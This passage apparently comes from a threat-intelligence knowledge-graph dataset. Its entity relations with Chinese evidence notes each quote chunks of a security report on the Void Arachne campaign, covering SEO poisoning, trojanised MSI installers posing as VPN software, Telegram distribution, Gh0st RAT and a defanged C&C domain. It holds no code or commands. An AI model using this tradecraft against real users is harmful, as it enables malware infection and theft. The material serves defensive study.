    {
      "type": "USE",
      "source": "asset--telegram-channels",
      "target": "technique--malicious-package",
      "confidence": 0.95,
      "evidence": "Telegram频道用于分发恶意软件包",
      "chunks_info": [
        {
          "chunk_id": 2,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n\n## Initial access  \nWe observed multiple initial access vectors that the Void Arachne threat actor group uses to distribute malware across the web and through social media platforms. These distribution methods include an infrastructure staged for SEO poisoning and malicious package distribution across Chinese-language-themed Telegram channels.",
          "chunk_length": 399,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access"
            ],
            "content_type": "text",
            "token_length": 56,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 3": "",
            "Header 4": "",
            "chunk_id": 2,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--behind-great-wall",
      "target": "attack-event--seo-poisoning-campaign",
      "confidence": 0.95,
      "evidence": "报告记录了SEO投毒攻击活动",
      "chunks_info": [
        {
          "chunk_id": 3,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
          "chunk_length": 1522,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **SEO poisoning (T1608.006)**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **SEO poisoning (T1608.006)**"
            ],
            "content_type": "text",
            "token_length": 322,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 3,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "LAUNCH",
      "source": "threat-org--void-arachne",
      "target": "attack-event--seo-poisoning-campaign",
      "confidence": 0.95,
      "evidence": "Void Arachne组织发起了攻击活动",
      "chunks_info": [
        {
          "chunk_id": 3,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
          "chunk_length": 1522,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **SEO poisoning (T1608.006)**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **SEO poisoning (T1608.006)**"
            ],
            "content_type": "text",
            "token_length": 322,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 3,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--seo-poisoning-campaign",
      "target": "target--chinese-users",
      "confidence": 0.95,
      "evidence": "攻击活动针对中文用户",
      "chunks_info": [
        {
          "chunk_id": 3,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
          "chunk_length": 1522,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **SEO poisoning (T1608.006)**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **SEO poisoning (T1608.006)**"
            ],
            "content_type": "text",
            "token_length": 322,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 3,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--seo-poisoning-campaign",
      "target": "technique--seo-poisoning",
      "confidence": 0.95,
      "evidence": "攻击活动使用SEO投毒技术",
      "chunks_info": [
        {
          "chunk_id": 3,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
          "chunk_length": 1522,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **SEO poisoning (T1608.006)**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **SEO poisoning (T1608.006)**"
            ],
            "content_type": "text",
            "token_length": 322,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 3,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--seo-poisoning-campaign",
      "target": "technique--spearphishing-link",
      "confidence": 0.95,
      "evidence": "攻击活动使用钓鱼链接技术",
      "chunks_info": [
        {
          "chunk_id": 3,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
          "chunk_length": 1522,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **SEO poisoning (T1608.006)**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **SEO poisoning (T1608.006)**"
            ],
            "content_type": "text",
            "token_length": 322,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 3,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "procedure--msi-execution",
      "target": "tool--msi-installer",
      "confidence": 0.95,
      "evidence": "执行过程使用MSI安装文件",
      "chunks_info": [
        {
          "chunk_id": 3,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
          "chunk_length": 1522,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **SEO poisoning (T1608.006)**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **SEO poisoning (T1608.006)**"
            ],
            "content_type": "text",
            "token_length": 322,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 3,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "asset--web-servers",
      "target": "procedure--msi-execution",
      "confidence": 0.95,
      "evidence": "Web服务器用于托管恶意MSI文件",
      "chunks_info": [
        {
          "chunk_id": 3,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
          "chunk_length": 1522,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **SEO poisoning (T1608.006)**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **SEO poisoning (T1608.006)**"
            ],
            "content_type": "text",
            "token_length": 322,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 3,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "USE",
      "source": "asset--c2-servers",
      "target": "procedure--msi-execution",
      "confidence": 0.95,
      "evidence": "C&C服务器用于控制恶意软件",
      "chunks_info": [
        {
          "chunk_id": 3,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **SEO poisoning (T1608.006)**  \nFor this campaign, Void Arachne set up a web infrastructure that is used for SEO poisoning that deployed spear-phishing links ([T1566.002](https://attack.mitre.org/techniques/T1566/002/)) disguised as legitimate software installers to lure potential victims. These links are hosted on web servers disguised as legitimate websites so that the Void Arachne threat group can proceed to make them rank high on search engines via SEO poisoning.  \nThese links contain MSI installers for common software targeting Chinese-speaking users such as Google Chrome, Chinese language packs for popular software, and VPNs such as LetsVPN and 快連VPN (also known as Quick VPN or Kuilian VPN). When these malicious MSI files or archive files are downloaded and executed, they would bootstrap the infection process. To the victim, it appears as if the intended software was installed. However, unbeknownst to them, additional malware is installed that beacons back to the attacker’s C&C server.  \nBecause MSI files are bundled software installers, threat actors can include backdoors and additional malware within the file bundle that are executed without the end user’s knowledge during the installation process.  \nIn this campaign, the Void Arachne group created subdomains of the domain *webcamcn[.]xyz* to act as C&C servers for the various MSI files. As the campaign progressed, various subdomains were added to this root domain.",
          "chunk_length": 1522,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **SEO poisoning (T1608.006)**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **SEO poisoning (T1608.006)**"
            ],
            "content_type": "text",
            "token_length": 322,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 3,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "attack-event--vpn-campaign",
      "confidence": 0.95,
      "evidence": "报告记录了与VPN相关的攻击活动",
      "chunks_info": [
        {
          "chunk_id": 4,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Targeting VPN-related technologies for spearphishing**  \nInternet connectivity in the People’s Republic of China is subject to strict regulation through a combination of legislative measures and technological controls collectively known as the [Great Firewall of China](https://www.britannica.com/topic/Great-Firewall). Due to strict government control, VPN services and public interest in this technology have notably increased. This has, in turn, enhanced threat actors' interest in exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nWe discovered that the VPN “快連VPN” is a common phishing and SEO poisoning vector used to target Chinese-speakers and the broader East Asian community. We have evidence of multiple distinct Chinese-speaking threat actors creating spear-phishing links and using SEO poisoning tactics by bundling this VPN with malware that includes Gh0st RAT and its variants.",
          "chunk_length": 1033,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Targeting VPN-related technologies for spearphishing**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Targeting VPN-related technologies for spearphishing**"
            ],
            "content_type": "text",
            "token_length": 190,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 4,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--vpn-campaign",
      "target": "target--chinese-speakers",
      "confidence": 0.95,
      "evidence": "攻击活动针对中文用户",
      "chunks_info": [
        {
          "chunk_id": 4,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Targeting VPN-related technologies for spearphishing**  \nInternet connectivity in the People’s Republic of China is subject to strict regulation through a combination of legislative measures and technological controls collectively known as the [Great Firewall of China](https://www.britannica.com/topic/Great-Firewall). Due to strict government control, VPN services and public interest in this technology have notably increased. This has, in turn, enhanced threat actors' interest in exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nWe discovered that the VPN “快連VPN” is a common phishing and SEO poisoning vector used to target Chinese-speakers and the broader East Asian community. We have evidence of multiple distinct Chinese-speaking threat actors creating spear-phishing links and using SEO poisoning tactics by bundling this VPN with malware that includes Gh0st RAT and its variants.",
          "chunk_length": 1033,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Targeting VPN-related technologies for spearphishing**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Targeting VPN-related technologies for spearphishing**"
            ],
            "content_type": "text",
            "token_length": 190,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 4,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--vpn-campaign",
      "target": "target--east-asian-community",
      "confidence": 0.95,
      "evidence": "攻击活动针对东亚社区",
      "chunks_info": [
        {
          "chunk_id": 4,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Targeting VPN-related technologies for spearphishing**  \nInternet connectivity in the People’s Republic of China is subject to strict regulation through a combination of legislative measures and technological controls collectively known as the [Great Firewall of China](https://www.britannica.com/topic/Great-Firewall). Due to strict government control, VPN services and public interest in this technology have notably increased. This has, in turn, enhanced threat actors' interest in exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nWe discovered that the VPN “快連VPN” is a common phishing and SEO poisoning vector used to target Chinese-speakers and the broader East Asian community. We have evidence of multiple distinct Chinese-speaking threat actors creating spear-phishing links and using SEO poisoning tactics by bundling this VPN with malware that includes Gh0st RAT and its variants.",
          "chunk_length": 1033,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Targeting VPN-related technologies for spearphishing**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Targeting VPN-related technologies for spearphishing**"
            ],
            "content_type": "text",
            "token_length": 190,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 4,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--vpn-campaign",
      "target": "technique--spearphishing",
      "confidence": 0.9,
      "evidence": "攻击活动使用鱼叉式网络钓鱼技术",
      "chunks_info": [
        {
          "chunk_id": 4,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Targeting VPN-related technologies for spearphishing**  \nInternet connectivity in the People’s Republic of China is subject to strict regulation through a combination of legislative measures and technological controls collectively known as the [Great Firewall of China](https://www.britannica.com/topic/Great-Firewall). Due to strict government control, VPN services and public interest in this technology have notably increased. This has, in turn, enhanced threat actors' interest in exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nWe discovered that the VPN “快連VPN” is a common phishing and SEO poisoning vector used to target Chinese-speakers and the broader East Asian community. We have evidence of multiple distinct Chinese-speaking threat actors creating spear-phishing links and using SEO poisoning tactics by bundling this VPN with malware that includes Gh0st RAT and its variants.",
          "chunk_length": 1033,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Targeting VPN-related technologies for spearphishing**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Targeting VPN-related technologies for spearphishing**"
            ],
            "content_type": "text",
            "token_length": 190,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 4,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "ATTACK",
      "source": "attack-event--vpn-campaign",
      "target": "technique--seo-poisoning",
      "confidence": 0.9,
      "evidence": "攻击活动使用SEO投毒技术",
      "chunks_info": [
        {
          "chunk_id": 4,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Targeting VPN-related technologies for spearphishing**  \nInternet connectivity in the People’s Republic of China is subject to strict regulation through a combination of legislative measures and technological controls collectively known as the [Great Firewall of China](https://www.britannica.com/topic/Great-Firewall). Due to strict government control, VPN services and public interest in this technology have notably increased. This has, in turn, enhanced threat actors' interest in exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nWe discovered that the VPN “快連VPN” is a common phishing and SEO poisoning vector used to target Chinese-speakers and the broader East Asian community. We have evidence of multiple distinct Chinese-speaking threat actors creating spear-phishing links and using SEO poisoning tactics by bundling this VPN with malware that includes Gh0st RAT and its variants.",
          "chunk_length": 1033,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Targeting VPN-related technologies for spearphishing**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Targeting VPN-related technologies for spearphishing**"
            ],
            "content_type": "text",
            "token_length": 190,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 4,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "technique--spearphishing",
      "target": "tool--vpn-software",
      "confidence": 0.9,
      "evidence": "鱼叉式网络钓鱼利用VPN软件",
      "chunks_info": [
        {
          "chunk_id": 4,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Targeting VPN-related technologies for spearphishing**  \nInternet connectivity in the People’s Republic of China is subject to strict regulation through a combination of legislative measures and technological controls collectively known as the [Great Firewall of China](https://www.britannica.com/topic/Great-Firewall). Due to strict government control, VPN services and public interest in this technology have notably increased. This has, in turn, enhanced threat actors' interest in exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nWe discovered that the VPN “快連VPN” is a common phishing and SEO poisoning vector used to target Chinese-speakers and the broader East Asian community. We have evidence of multiple distinct Chinese-speaking threat actors creating spear-phishing links and using SEO poisoning tactics by bundling this VPN with malware that includes Gh0st RAT and its variants.",
          "chunk_length": 1033,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Targeting VPN-related technologies for spearphishing**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Targeting VPN-related technologies for spearphishing**"
            ],
            "content_type": "text",
            "token_length": 190,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 4,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "technique--seo-poisoning",
      "target": "tool--vpn-software",
      "confidence": 0.9,
      "evidence": "SEO投毒利用VPN软件",
      "chunks_info": [
        {
          "chunk_id": 4,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Targeting VPN-related technologies for spearphishing**  \nInternet connectivity in the People’s Republic of China is subject to strict regulation through a combination of legislative measures and technological controls collectively known as the [Great Firewall of China](https://www.britannica.com/topic/Great-Firewall). Due to strict government control, VPN services and public interest in this technology have notably increased. This has, in turn, enhanced threat actors' interest in exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nWe discovered that the VPN “快連VPN” is a common phishing and SEO poisoning vector used to target Chinese-speakers and the broader East Asian community. We have evidence of multiple distinct Chinese-speaking threat actors creating spear-phishing links and using SEO poisoning tactics by bundling this VPN with malware that includes Gh0st RAT and its variants.",
          "chunk_length": 1033,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Targeting VPN-related technologies for spearphishing**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Targeting VPN-related technologies for spearphishing**"
            ],
            "content_type": "text",
            "token_length": 190,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 4,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "APPLY",
      "source": "technique--spearphishing",
      "target": "tool--gh0st-rat",
      "confidence": 0.9,
      "evidence": "鱼叉式网络钓鱼使用Gh0st RAT",
      "chunks_info": [
        {
          "chunk_id": 4,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Targeting VPN-related technologies for spearphishing**  \nInternet connectivity in the People’s Republic of China is subject to strict regulation through a combination of legislative measures and technological controls collectively known as the [Great Firewall of China](https://www.britannica.com/topic/Great-Firewall). Due to strict government control, VPN services and public interest in this technology have notably increased. This has, in turn, enhanced threat actors' interest in exploiting the heightened public interest in software that can evade the Great Firewall and online censorship.  \nWe discovered that the VPN “快連VPN” is a common phishing and SEO poisoning vector used to target Chinese-speakers and the broader East Asian community. We have evidence of multiple distinct Chinese-speaking threat actors creating spear-phishing links and using SEO poisoning tactics by bundling this VPN with malware that includes Gh0st RAT and its variants.",
          "chunk_length": 1033,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Targeting VPN-related technologies for spearphishing**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Targeting VPN-related technologies for spearphishing**"
            ],
            "content_type": "text",
            "token_length": 190,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 4,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "BELONG",
      "source": "report--great-wall",
      "target": "attack-event--telegram-spearphishing",
      "confidence": 0.95,
      "evidence": "报告记录了通过Telegram进行的鱼叉式网络钓鱼攻击活动",
      "chunks_info": [
        {
          "chunk_id": 5,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Spearphishing through Telegram**  \nWe observed several Telegram channels, some of which had tens of thousands of Chinese-speaking users, advertising malicious archives and MSI files as an additional distribution method. The malicious packages are in what appear to be Simplified Chinese language packs for Telegram as well as various AI tools.",
          "chunk_length": 421,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "header_hierarchy": [
              "# Behind the Great Wall Void Arachne Targets Chinese",
              "## Initial access",
              "### **Spearphishing through Telegram**"
            ],
            "content_type": "text",
            "token_length": 67,
            "has_full_header_context": true,
            "document_title": "Behind the Great Wall Void Arachne Targets Chinese",
            "Header 4": "",
            "chunk_id": 5,
            "total_chunks": 37
          }
        }
      ]
    },
    {
      "type": "LAUNCH",
      "source": "threat-org--void-arachne",
      "target": "attack-event--telegram-spearphishing",
      "confidence": 0.95,
      "evidence": "Void Arachne组织发起了攻击活动",
      "chunks_info": [
        {
          "chunk_id": 5,
          "chunk_type": "text",
          "chunk_content": "# Behind the Great Wall Void Arachne Targets Chinese\n## Initial access\n\n### **Spearphishing through Telegram**  \nWe observed several Telegram channels, some of which had tens of thousands of Chinese-speaking users, advertising malicious archives and MSI files as an additional distribution method. The malicious packages are in what appear to be Simplified Chinese language packs for Telegram as well as various AI tools.",
          "chunk_length": 421,
          "source_metadata": {
            "Header 1": "# Behind the Great Wall Void Arachne Targets Chinese",
            "Header 2": "## Initial access",
            "Header 3": "### **Spearphishing through Telegram**",
            "header_hierarchy": [
